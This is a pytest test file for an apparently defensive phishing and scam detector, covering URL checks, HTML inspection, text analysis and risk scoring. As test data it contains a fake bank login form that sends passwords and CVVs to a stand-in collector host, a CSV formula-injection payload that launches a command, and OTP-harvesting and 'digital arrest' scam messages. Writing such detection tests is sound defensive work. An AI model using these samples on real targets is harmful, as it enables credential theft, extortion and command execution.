import os
import pytest
from app.detectors.phishing import PhishingDetector
from app.detectors.html_inspector import HTMLInspector
from app.detectors.javascript import JavaScriptInspector
from app.detectors.domain_intel import DomainIntelligence
from app.detectors.content_analysis import ContentAnalyzer
from app.detectors.qr_decoder import QRDecoder
from app.engines.risk_scorer import RiskScorer
from app.engines.threat_intel import ThreatIntelligence
from app.engines.file_analyzer import FileAnalyzer
from app.engines.image_analyzer import ImageAnalyzer
from app.schemas.scan import Finding, SeverityLevel


@pytest.fixture
def phishing_detector():
    return PhishingDetector()


@pytest.fixture
def content_analyzer():
    return ContentAnalyzer()


@pytest.fixture
def risk_scorer():
    return RiskScorer()


# 1. Normal HTTPS website URL test
def test_normal_https_url(phishing_detector):
    findings = phishing_detector.check_url("https://www.wikipedia.org")
    # Wikipedia should have minimal or no high/critical phishing findings
    high_findings = [f for f in findings if f.severity in [SeverityLevel.critical, SeverityLevel.high]]
    assert len(high_findings) == 0


# 2. Known suspicious test domain (from local test dataset)
@pytest.mark.asyncio
async def test_known_test_malicious_domain():
    intel = ThreatIntelligence()
    findings, status = await intel.check_url("https://malware.testing.google.test")
    crit_or_high = [f for f in findings if f.severity in [SeverityLevel.critical, SeverityLevel.high]]
    assert len(crit_or_high) > 0


# 3. URL containing suspicious characters / obfuscation
def test_suspicious_url_characters(phishing_detector):
    suspicious_url = "http://192.168.1.1@secure-login.bank-account-update.ga/verify?token=xyz"
    findings = phishing_detector.check_url(suspicious_url)
    assert len(findings) > 0


# 4. URL shortener detection
def test_url_shortener(phishing_detector):
    short_url = "https://bit.ly/3xSecurityCheck"
    findings = phishing_detector.check_url(short_url)
    shortener_found = any("shortener" in f.title.lower() or "shortener" in f.description.lower() for f in findings)
    assert shortener_found


# 5. Fake banking website indicators in HTML
def test_fake_banking_html():
    inspector = HTMLInspector()
    fake_bank_html = """
    <html>
      <body>
        <form action="http://malicious-collector.com/steal" method="POST">
          <input type="text" name="netbanking_user" placeholder="Customer ID" />
          <input type="password" name="password" placeholder="Password" />
          <input type="text" name="card_cvv" placeholder="CVV" />
          <button type="submit">Login to State Bank</button>
        </form>
      </body>
    </html>
    """
    findings = inspector.inspect(fake_bank_html, "http://fake-sbi-portal.com")
    assert any("form" in f.title.lower() or "password" in f.title.lower() for f in findings)


# 6. Harmless text vs Phishing text
def test_ordinary_harmless_text(content_analyzer):
    harmless = "Hello team, please find attached the meeting minutes for Tuesday's quarterly planning session. Thank you."
    findings = content_analyzer.analyze_text(harmless)
    critical_findings = [f for f in findings if f.severity == SeverityLevel.critical]
    assert len(critical_findings) == 0


# 7. Scam message containing OTP requests
def test_scam_message_with_otp(content_analyzer):
    scam = "URGENT: Your HDFC bank account is suspended due to KYC non-compliance. Share the 6-digit OTP immediately to avoid permanent deactivation."
    findings = content_analyzer.analyze_text(scam)
    assert len(findings) > 0
    assert any("otp" in f.title.lower() or "urgency" in f.title.lower() or "credential" in f.title.lower() for f in findings)


# 8. Digital arrest scam message detection
def test_digital_arrest_message(content_analyzer):
    digital_arrest_text = (
        "This is Officer Vikram from CBI Cyber Crime Cell. A non-bailable arrest warrant has been issued against your "
        "Aadhaar number regarding a narcotics parcel seized by Customs. You are placed under DIGITAL ARREST. "
        "Keep your video camera on or SWAT teams will raid your home immediately."
    )
    findings = content_analyzer.analyze_text(digital_arrest_text)
    assert any("digital arrest" in f.title.lower() or "intimidation" in f.title.lower() or "law enforcement" in f.title.lower() for f in findings)


# 9. CSV formula injection detection
def test_csv_injection(content_analyzer):
    dangerous_csv = "Name,Amount,Notes\nJohn,1000,=cmd|' /C calc'!A0\nAlice,2000,@SUM(1+1)"
    findings = content_analyzer.analyze_csv_content(dangerous_csv)
    assert any("csv" in f.title.lower() or "formula" in f.title.lower() for f in findings)


# 10. Risk score calculation boundaries
def test_risk_scorer(risk_scorer):
    # No findings -> Safe
    score, threat_level, conf = risk_scorer.calculate([])
    assert score == 0
    assert threat_level == "SAFE-LOOKING"

    # High severity findings -> High or Critical risk
    critical_findings = [
        Finding(title="Embedded Malware Exploit", description="Dropper detected", severity=SeverityLevel.critical, category="Malware"),
        Finding(title="Credential Harvesting", description="Stolen OTPs", severity=SeverityLevel.critical, category="Phishing"),
        Finding(title="Impersonation Attack", description="Fake Police Notice", severity=SeverityLevel.high, category="Extortion"),
    ]
    score, threat_level, conf = risk_scorer.calculate(critical_findings)
    assert score >= 60
    assert threat_level in ["HIGH RISK", "CRITICAL RISK"]
    assert conf == "HIGH"
